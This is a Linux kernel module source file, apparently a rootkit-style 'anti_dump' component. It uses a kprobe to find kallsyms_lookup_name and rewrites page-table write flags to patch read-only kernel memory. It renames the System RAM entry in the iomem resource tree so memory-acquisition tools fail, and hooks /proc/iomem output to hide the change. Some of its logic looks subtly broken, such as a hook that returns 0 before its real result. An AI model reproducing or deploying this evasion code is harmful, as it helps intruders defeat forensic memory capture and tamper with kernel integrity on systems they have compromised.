#include <linux/list.h>
#include<linux/slab.h>
#include <linux/ioport.h>
#include <asm/unistd.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/elf.h>

#define MAGIC_STRING "_-_-_-_-_-"

struct changed_resource {
    struct list_head list;
    struct resource *resource;
};
LIST_HEAD(changed_resources);

struct resource *iomem = &iomem_resource;

typedef int (*seq_show_func_t)(struct seq_file *m, void *v);
seq_show_func_t orig_show_func;

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_func;
static struct kprobe ksyms_finder = {
    .symbol_name = "kallsyms_lookup_name"
};
struct seq_operations *hooked_ops;

int set_page_write(unsigned long addr)
{
    // Edit the PTE flags of the page to enable writing
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte & ~_PAGE_RW)
    {
        pte->pte |= _PAGE_RW;
        printk(KERN_INFO "anti_dump: modified a page frame to write\n");
        return 1;
    }
    return 0;
}

void set_page_no_write(unsigned long addr)
{
    // Edit the PTE flags of the page to disable writing
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    printk(KERN_INFO "anti_dump: modified a page frame to read only\n");

}

int iomem_show_hook(struct seq_file *m, void *v)
{
    // v is a resource struct pointer.
    struct resource *current_resource = v;
    int result;

    // Look for values we modified
    if (!strcmp(current_resource->name, MAGIC_STRING))
    {

        // Un-modify them before sending them to user
        printk(KERN_INFO "anti_dump: %s\n", current_resource->name);
        set_page_write((unsigned long)iomem->name);
        strcpy((char *)current_resource->name, "System RAM");
        result = orig_show_func(m, v);

        // Re-modify them
        strcpy((char *)current_resource->name, MAGIC_STRING);
        set_page_no_write((unsigned long)iomem->name);
    }
    else
    {
        result = orig_show_func(m, v);
    }
    return 0;
    
    // Return control to the original show func
    return result;
}

void resource_hider_init(void)
{
    struct changed_resource *entry;
    printk(KERN_INFO "anti_dump: init\n");
    
    // Manage list of modified resources
    for (iomem = iomem->child; iomem != NULL; iomem = iomem->sibling)
    {
        if (!strcmp(iomem->name, "System RAM"))
        {   
            // Append resource to a list of changed resources
            entry = (struct changed_resource *)kmalloc(sizeof(struct changed_resource), GFP_KERNEL);
            entry->resource = iomem;
            INIT_LIST_HEAD(&entry->list);
            list_add_tail(&entry->list, &changed_resources);

            // Change resource visible name
            set_page_write((unsigned long)iomem->name);
            strcpy((char *)iomem->name, MAGIC_STRING); // Very benign string here
            set_page_no_write((unsigned long)iomem->name);
            printk(KERN_INFO "anti_dump: overridden System RAM\n");
            break;
        }
    }

    // Hook the show function of /proc/iomem
    register_kprobe(&ksyms_finder);
    kallsyms_lookup_func = (kallsyms_lookup_name_t)ksyms_finder.addr;
    unregister_kprobe(&ksyms_finder);

    hooked_ops = (struct seq_operations *)kallsyms_lookup_func("resource_op");
    orig_show_func = hooked_ops->show;

    set_page_write((unsigned long)hooked_ops);
    hooked_ops->show = iomem_show_hook;
    set_page_no_write((unsigned long)hooked_ops);

    return;
}

void resource_hider_exit(void)
{
    struct changed_resource *current_resource, *next_resource;
    struct resource *changed_resource;


    // Restore each modified resource original name
    list_for_each_entry_safe(current_resource, next_resource, &changed_resources, list)
    {
        changed_resource = current_resource->resource;
        set_page_write((unsigned long)changed_resource->name);
        strcpy((char *)changed_resource->name, "System RAM");
        set_page_no_write((unsigned long)changed_resource->name);
        
        // Free list resources
        list_del(&current_resource->list);
        kfree(current_resource);
        break;

    }
    printk(KERN_INFO "anti_dump: restored System RAM\n");

    // Unhook the show function of /proc/iomem
    set_page_write((unsigned long)hooked_ops);
    hooked_ops->show = orig_show_func;
    set_page_no_write((unsigned long)hooked_ops);

    return;
}